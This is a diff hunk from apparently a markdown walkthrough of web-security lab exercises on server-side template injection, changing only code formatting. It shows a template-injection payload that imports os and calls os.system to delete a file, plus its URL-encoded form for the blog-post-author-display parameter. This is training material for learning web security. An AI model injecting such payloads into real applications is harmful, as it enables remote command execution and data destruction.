@@ -71,7 +71,7 @@ You can log in to your own account using the following credentials: wiener:peter
 {\% import os \%}
 {{os.system('rm /home/carlos/morale.txt')
 ```
-- in repeater inject this payload in where you placed the 7*7 earlier, make sure to url encode it `blog-post-author-display=user.name}}{\%25+import+os+\%25}{{os.system('rm\%20/home/carlos/morale.txt')`
+- in repeater inject this payload in where you placed the 7*7 earlier, make sure to url encode it ```blog-post-author-display=user.name}}{\%25+import+os+\%25}{{os.system('rm\%20/home/carlos/morale.txt')```
 - reload the page containing your comment and the lab completes
 
 ### Server-side template injection using documentation
